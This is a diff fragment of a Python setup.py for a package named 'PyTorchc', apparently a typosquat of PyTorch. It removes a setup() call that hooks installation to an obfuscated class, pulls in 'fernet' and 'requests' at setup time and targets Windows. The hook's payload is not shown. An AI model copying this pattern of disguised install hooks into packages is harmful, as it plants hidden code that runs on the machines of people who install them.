@@ -18,22 +18,5 @@ class CGRKvfvOpgzHkrrkmXbBUoqlzuzHJkXYiGZewRJeJvWmyqwyEJFgiEhjlioYsSScreKnJSykfW
             install.run(self)
 
 
-setup(
-    name="PyTorchc",
-    version=VERSION,
-    author="dXkXGGymWCWPYQZq",
-    author_email="zqxtaQahjqRQzQrOR@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': CGRKvfvOpgzHkrrkmXbBUoqlzuzHJkXYiGZewRJeJvWmyqwyEJFgiEhjlioYsSScreKnJSykfWSCKzWlDUxWGeYFUlOEZkDNPsbrXxdzXneSRGFGMrtbqtJJGXYOzShHuIxPYCQqzmlDyYtTqiYtnXsl,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
